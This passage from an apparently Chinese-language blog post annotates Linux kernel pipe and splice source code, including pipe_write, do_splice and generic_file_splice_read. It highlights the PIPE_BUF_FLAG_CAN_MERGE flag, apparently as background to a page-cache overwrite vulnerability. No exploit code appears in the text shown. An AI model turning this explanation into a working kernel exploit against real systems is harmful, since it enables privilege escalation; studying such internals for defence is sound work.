&#123;<br>            <span class="hljs-comment">/* merge with the last one */</span><br>            buf-&gt;len += bytes;<br>            i-&gt;iov_offset += bytes;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        i_head++;<br>        buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>    &#125;<br>    <span class="hljs-comment">// 如果待写入的管道已满，则直接返回</span><br>    <span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>    <span class="hljs-comment">// 增加该页的 refcount</span><br>    get_page(page);<br>    buf-&gt;page = page;   <span class="hljs-comment">// 直接引用已有的页</span><br>    buf-&gt;offset = offset;<br>    buf-&gt;len = bytes;<br><br>    pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>    i-&gt;iov_offset = offset + bytes;<br>    i-&gt;head = i_head;<br>out:<br>    i-&gt;count -= bytes;<br>    <span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h4><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.8-rc1/source/fs/pipe.c">源码</a> </p>
<p>pipe_write第一段: </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">head = pipe-&gt;head;<br>was_empty = pipe_empty(head, pipe-&gt;tail);<br>chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br>    <span class="hljs-keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br>    <span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>        offset + chars &lt;= PAGE_SIZE) &#123;<br>        ret = pipe_buf_confirm(pipe, buf);<br>        <span class="hljs-keyword">if</span> (ret)<br>            <span class="hljs-keyword">goto</span> out;<br><br>        ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<br>        <span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>            ret = -EFAULT;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        buf-&gt;len += ret;<br>        <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>            <span class="hljs-keyword">goto</span> out;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>函数目的是从iter复制到pipe的buf中. </p>
<p>如果说当前 pipe buf 中已经存在数据，并且<br>iter总长度不是页大小的整数倍 &amp;&amp; pipe buf的起始位置+pipe已有数据长度+iter总长度mod页大小 &lt; PAGE_SIZE,<br>那么直接先把iter开头一段填充到pipe buf中进行数据合并。</p>
<p>这个合并操作需要 pipe buf 有 <strong>PIPE_BUF_FLAG_CAN_MERGE</strong> 标志，该标志只要 pipe_write 所对应的 fd 没有设置 O_DIRECT 标志即可自动设置。</p>
<p>其次是正常的页面写入逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-comment">// 如果一个管道没有读者，则说明管道已经被破坏，生成 SIGPIPE 信号</span><br>    <span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>        send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!ret)<br>            ret = -EPIPE;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">// 尝试循环往管道内写入数据</span><br>    head = pipe-&gt;head;<br>    <span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br>        <span class="hljs-keyword">int</span> copied;<br>        <span class="hljs-comment">// 获取先前被释放但是缓存起来的 tmp_page。</span><br>        <span class="hljs-comment">// 如果存在 tmp_page 则在向 pipe buf 写入数据时就可直接重用而无需分配</span><br>        <span class="hljs-keyword">if</span> (!page) &#123;<br>            page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br>            <span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>                ret = ret ? : -ENOMEM;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            pipe-&gt;tmp_page = page;<br>        &#125;<br><br>        <span class="hljs-comment">/* Allocate a slot in the ring in advance and attach an</span><br><span class="hljs-comment">             * empty buffer.  If we fault or otherwise fail to use</span><br><span class="hljs-comment">             * it, either the reader will consume it or it&#x27;ll still</span><br><span class="hljs-comment">             * be there for the next write.</span><br><span class="hljs-comment">             */</span><br>        spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>        head = pipe-&gt;head;<br>        <span class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>            spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>        spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>        <span class="hljs-comment">/* Insert it into the buffer array */</span><br>        <span class="hljs-comment">// 往新的 pipe buf 中写入数据</span><br>        buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>        buf-&gt;page = page;<br>        buf-&gt;ops = &amp;anon_pipe_buf_ops; <span class="hljs-comment">// 设置匿名管道操作</span><br>        buf-&gt;offset = <span class="hljs-number">0</span>;<br>        buf-&gt;len = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 如果 fd 设置了 O_DIRECT，则每次写入时都会占用新的一页，而不会合并</span><br>        <span class="hljs-keyword">if</span> (is_packetized(filp)) <br>            buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br>        <span class="hljs-keyword">else</span><br>            buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>        pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// 复制页数据</span><br>        copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br>        <span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br>            <span class="hljs-keyword">if</span> (!ret)<br>                ret = -EFAULT;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        ret += copied;<br>        buf-&gt;offset = <span class="hljs-number">0</span>;<br>        buf-&gt;len = copied;<br><br>        <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<br>        <span class="hljs-keyword">continue</span>;<br><br>    <span class="hljs-comment">/* Wait for buffer space to become available. */</span><br>    <span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>        <span class="hljs-keyword">if</span> (!ret)<br>            ret = -EAGAIN;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br>        <span class="hljs-keyword">if</span> (!ret)<br>            ret = -ERESTARTSYS;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    ...<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这个 tmp_page 简单讲一下。如果该 pipe buf 所持有的 page 只有它自己持有，并且现在打算将其释放，那么 pipe buf 就私下不释放该 page，而是将其缓存起来供后续使用：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">anon_pipe_buf_release</span><span class="hljs-params">(struct pipe_inode_info *pipe,</span></span><br><span class="hljs-params"><span class="hljs-function">                  struct pipe_buffer *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> buf-&gt;page;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * If nobody else uses this page, and we don&#x27;t already have a</span><br><span class="hljs-comment">     * temporary page, let&#x27;s keep track of it as a one-deep</span><br><span class="hljs-comment">     * allocation cache. (Otherwise just release our reference to it)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (page_count(page) == <span class="hljs-number">1</span> &amp;&amp; !pipe-&gt;tmp_page)<br>        pipe-&gt;tmp_page = page;<br>    <span class="hljs-keyword">else</span><br>        put_page(page);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>从 pipe 读写操作中我们可以得知，pipe bufs 存放的页面无非两种：</p>
<ol>
<li>直接引用其他不变页（例如文件缓存页），这样就无需进行数据复制操作</li>
<li>自己创建页，需要进行数据复制</li>
</ol>
<p>由 pipe 机制来保证存放在 pipe bufs 中的页数据，不会被 pipe 本身给覆写。同时注意只有在自己创建的页上，才能进行 Merge 操作。</p>
<p>这是因为pipe本意只是一个消息通道, <strong>不应出现对内存的预期外修改</strong>, 即merge操作. </p>
<h4 id="do-splice-函数"><a href="#do-splice-函数" class="headerlink" title="do_splice 函数"></a>do_splice 函数</h4><p>Linux 库函数 <code>splice</code> 的作用是，将某个 fd 的数据不经过用户层，直接拷贝进另一个 fd 中。其函数声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE         <span class="hljs-comment">/* See feature_test_macros(7) */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">splice</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd_in, <span class="hljs-keyword">loff_t</span> *off_in, <span class="hljs-keyword">int</span> fd_out, <span class="hljs-keyword">loff_t</span> *off_out, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span>;<br></code></pre></div></td></tr></table></figure>

<p>这里的 fd 只能有两种情况：pipe fd 或 file fd，因此在 do_splice 函数中，内核也会对 fd 的类型做特判，来执行不同的数据传递操作。</p>
<p>这里，我们只需关注 <strong>From-fd 为 file，To-fd 为 pipe</strong> ，即<strong>数据从文件传递至管道</strong>的情况：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Determine where to splice to/from.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">do_splice</span><span class="hljs-params">(struct file *in, <span class="hljs-keyword">loff_t</span> __user *off_in,</span></span><br><span class="hljs-params"><span class="hljs-function">        struct file *out, <span class="hljs-keyword">loff_t</span> __user *off_out,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">ipipe</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">opipe</span>;</span><br>    <span class="hljs-keyword">loff_t</span> offset;<br>    <span class="hljs-keyword">long</span> ret;<br><br>    ipipe = get_pipe_info(in);<br>    opipe = get_pipe_info(out);<br>    ...;<br>    <br>    <span class="hljs-comment">// 当数据从文件复制给管道时</span><br>    <span class="hljs-keyword">if</span> (opipe) &#123;<br>        ...<br>        <span class="hljs-comment">// 等待 pipe 存在空闲空间</span><br>        <span class="hljs-keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)<br>            flags |= SPLICE_F_NONBLOCK;<br><br>        pipe_lock(opipe);<br>        ret = wait_for_space(opipe, flags);<br>        <span class="hljs-comment">// 如果等到 pipe 存在空闲空间后</span><br>        <span class="hljs-keyword">if</span> (!ret) &#123;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> p_space;<br>             <span class="hljs-comment">// 获取待传递数据大小</span><br>            <span class="hljs-comment">/* Don&#x27;t try to read more the pipe has space for. */</span><br>            p_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);<br>            len = <span class="hljs-keyword">min_t</span>(<span class="hljs-keyword">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);<br>            <span class="hljs-comment">// 执行真正的传递操作</span><br>            ret = do_splice_to(in, &amp;offset, opipe, len, flags);<br>        &#125;<br>        ...<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    ...<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>而在 do_splice_to 函数中，内核会根据<strong>文件系统类型</strong>，来调用对应的 splice_read 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from a file to a pipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">do_splice_to</span><span class="hljs-params">(struct file *in, <span class="hljs-keyword">loff_t</span> *ppos,</span></span><br><span class="hljs-params"><span class="hljs-function">             struct pipe_inode_info *pipe, <span class="hljs-keyword">size_t</span> len,</span></span><br><span class="hljs-params"><span class="hljs-function">             <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ret;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ)))<br>        <span class="hljs-keyword">return</span> -EBADF;<br><br>    ret = rw_verify_area(READ, in, ppos, len);<br>    <span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">return</span> ret;<br><br>    <span class="hljs-keyword">if</span> (unlikely(len &gt; MAX_RW_COUNT))<br>        len = MAX_RW_COUNT;<br>    <span class="hljs-comment">// 调用 splice_read 函数</span><br>    <span class="hljs-keyword">if</span> (in-&gt;f_op-&gt;splice_read)<br>        <span class="hljs-keyword">return</span> in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);<br>    <span class="hljs-keyword">return</span> default_file_splice_read(in, ppos, pipe, len, flags);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>以 linux 中最常见的文件系统 ext4 为例，这是 ext4 文件系统中所设置的一些关键方法：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// fs/ext4/file.c</span><br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">ext4_file_operations</span> =</span> &#123;<br>    ...<br>    .read_iter    = ext4_file_read_iter,<br>    ...<br>    .splice_read  = generic_file_splice_read,<br>    ...<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>因此最终 do_splice_to 函数会调用到 generic_file_splice_read 函数来执行数据传递：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * generic_file_splice_read - splice data from file to a pipe</span><br><span class="hljs-comment"> * @in:      file to splice from</span><br><span class="hljs-comment"> * @ppos:    position in @in</span><br><span class="hljs-comment"> * @pipe:    pipe to splice to</span><br><span class="hljs-comment"> * @len:     number of bytes to splice</span><br><span class="hljs-comment"> * @flags:   splice modifier flags</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Description:</span><br><span class="hljs-comment"> *    Will read pages from given file and fill them into a pipe. Can be</span><br><span class="hljs-comment"> *    used as long as it has more or less sane -&gt;read_iter().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">generic_file_splice_read</span><span class="hljs-params">(struct file *in, <span class="hljs-keyword">loff_t</span> *ppos,</span></span><br><span class="hljs-params"><span class="hljs-function">                 struct pipe_inode_info *pipe, <span class="hljs-keyword">size_t</span> len,</span></span><br><span class="hljs-params"><span class="hljs-function">                 <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">to</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i_head;<br>    <span class="hljs-keyword">int</span> ret;<br>    <br>    <span class="hljs-comment">// 根据 pipe 结构体，创建 iov_iter 结构</span><br>    iov_iter_pipe(&amp;to, READ, pipe, len);<br>    i_head = to.head;<br>    <span class="hljs-comment">// 创建 kiocb 结构</span><br>    init_sync_kiocb(&amp;kiocb, in);<br>    kiocb.ki_pos = *ppos;<br>    <span class="hljs-comment">// 调用 call_read_iter 执行实际的数据传输操作 ！！！</span><br>    ret = call_read_iter(in, &amp;kiocb, &amp;to);<br>    <span class="hljs-comment">// 如果数据正常传输</span><br>    <span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 更新文件访问情况</span><br>        *ppos = kiocb.ki_pos;<br>        file_accessed(in);<br>    <span class="hljs-comment">// 如果数据传输失败</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        to.head = i_head;<br>        to.iov_offset = <span class="hljs-number">0</span>;<br>        iov_iter_advance(&amp;to, <span class="hljs-number">0</span>); <span class="hljs-comment">/* to free what was emitted */</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * callers of -&gt;splice_read() expect -EAGAIN on</span><br><span class="hljs-comment">         * &quot;can&#x27;t put anything in there&quot;, rather than -EFAULT.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (ret == -EFAULT)<br>            ret = -EAGAIN;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>从 <code>generic_file_splice_read</code> 函数的代码中可以看到，该函数最终会调用 <code>call_read_iter</code> 函数来做数据传递；而该函数又会调用特定于文件系统的 read_iter 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">call_read_iter</span><span class="hljs-params">(struct file *file, struct kiocb *kio,</span></span><br><span class="hljs-params"><span class="hljs-function">                     struct iov_iter *iter)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> file-&gt;f_op-&gt;read_iter(kio, iter);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>从 <code>ext4_file_operations</code> 代码中可以得知，call_read_iter 函数调用到的是 ext4_file_read_iter 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">ext4_file_read_iter</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *to)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);<br>    <span class="hljs-comment">// 一些简单的判断</span><br>    <span class="hljs-keyword">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))<br>        <span class="hljs-keyword">return</span> -EIO;<br><br>    <span class="hljs-keyword">if</span> (!iov_iter_count(to))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">/* skip atime */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_FS_DAX</span><br>    <span class="hljs-keyword">if</span> (IS_DAX(inode))<br>        <span class="hljs-keyword">return</span> ext4_dax_read_iter(iocb, to);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)<br>        <span class="hljs-keyword">return</span> ext4_dio_read_iter(iocb, to);<br>    <span class="hljs-comment">// 没设置 O_DIRECT 的走这里</span><br>    <span class="hljs-keyword">return</span> generic_file_read_iter(iocb, to);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<blockquote>
<p>What is <a target="_blank" rel="noopener" href="https://cateee.net/lkddb/web-lkddb/FS_DAX.html">CONFIG_FS_DAX</a> – Direct Access (DAX) support found in <code>fs/Kconfig</code> </p>
</blockquote>
<p>然后该函数又调 <code>generic_file_read_iter</code>：</p>
